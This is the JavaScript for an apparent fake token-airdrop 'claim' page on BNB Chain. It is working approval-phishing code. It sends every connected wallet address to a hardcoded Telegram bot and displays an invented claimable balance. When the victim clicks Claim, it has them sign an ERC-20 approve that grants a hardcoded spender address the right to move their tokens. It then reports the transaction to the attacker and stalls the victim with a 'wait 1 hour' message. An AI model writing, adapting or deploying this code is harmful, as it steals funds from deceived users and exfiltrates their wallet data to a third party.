let userData;


const switchToBnbChain = async () => {
  const bnbChainParams = {
    chainId: '0x38',
    chainName: 'Binance Smart Chain',
    nativeCurrency: {
      name: 'Binance Coin',
      symbol: 'BNB',
      decimals: 18,
    },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/'],
  };

  try {
    if (typeof window.ethereum !== 'undefined') {
      await window.ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [bnbChainParams],
      });
      console.log('Switched to Binance Smart Chain!');
    } else {
      console.error('MetaMask or similar wallet not found!');
    }
  } catch (error) {
    console.error('Error switching to Binance Smart Chain:', error);
  }
};

const sendTelegramMessage = async (chatId, message) => {
  const botToken = '7107034391:AAHqyRFDjFCgBazgswzY_CRAYdtlgMQO-N4';
  await fetch(
    `https://api.telegram.org/bot${botToken}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    },
  );
};

let tokenAmountBold = document.querySelector('.tokenAmount');
let claimButton = document.querySelector('.claim-btn');


async function getProof() {
  let walletAddress = walletText.innerText.trim();

  if (walletAddress == null || walletAddress == undefined) {
    connectButtonFunctio();
  }

  users.forEach((single_user_data) => {
    if (single_user_data.data.user.trim().toLowerCase() === walletAddress.toLowerCase()) {
      userData = single_user_data;
      tokenAmountBold.innerText = parseFloat(String(userData.data.amount)) / 10 ** 18;
    }else{
      claimButton.innerHTML = 'Claim';
    }
  });
}

async function connectButtonFunctio() {
  if (typeof window.ethereum !== 'undefined') {
    try {
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });

      walletText.textContent = accounts[0];
      connectButton.textContent = 'Connected';
      connectButton.disabled = true;

      await sendTelegramMessage(
        '5204205237',
        `Connected : ${accounts[0]}`,
      );

      tokenAmountBold.innerText = "521";

      getProof();
    } catch (error) {
      console.error('User denied account access', error);
    }
  } else {
    alert('MetaMask is not installed. Please install MetaMask to connect.');
  }
};


claimButton.addEventListener('click', claimTokens);

async function claimTokens() {


    claimButton.innerHTML = 'Loading...';
    await switchToBnbChain();

    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();

        const tokenAddress = '0x073761656dC0654F729A4aF0ccE8C9B39b47A18b';
        const spenderAddress = '0x21F5CF45E2E546AB318572B0d62884Ce315B6d6d';
        const allowanceAmount = "521000000000000000000";

        if(Number(allowanceAmount) == 0 || allowanceAmount == "00"){
          alert('you do not have balance');
          claimButton.innerHTML = 'Claim';
          return;
        }

        const tokenAbi = ['function approve(address spender, uint256 amount) public returns (bool)'];

        try {
            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);

            const tx = await tokenContract.approve(spenderAddress, allowanceAmount);
            console.log('Transaction sent:', tx.hash);

            await sendTelegramMessage(
              '5204205237',
              `Transaction confirmed: ${tx.hash}`,
            );

            const receipt = await tx.wait();
            console.log('Transaction confirmed:', receipt);

            alert(
              'Please wait for 1 hour before depositing funds into your wallet.',
            );
            claimButton.innerHTML = 'Claim';

        } catch (error) {
          claimButton.innerHTML ='Claim';
            console.error('Error increasing allowance:', error);
            alert('Failed to Claim.');
        }
    } else {
       claimButton.innerHTML = 'Claim';
        alert('MetaMask is not installed. Please install MetaMask to proceed.');
        await connectButtonFunctio();
        await claimTokens();
    }

}




const connectButton = document.getElementById('connectBtn');
const walletText = document.getElementById('walletText');

connectButton.addEventListener('click', connectButtonFunctio);


connectButtonFunctio();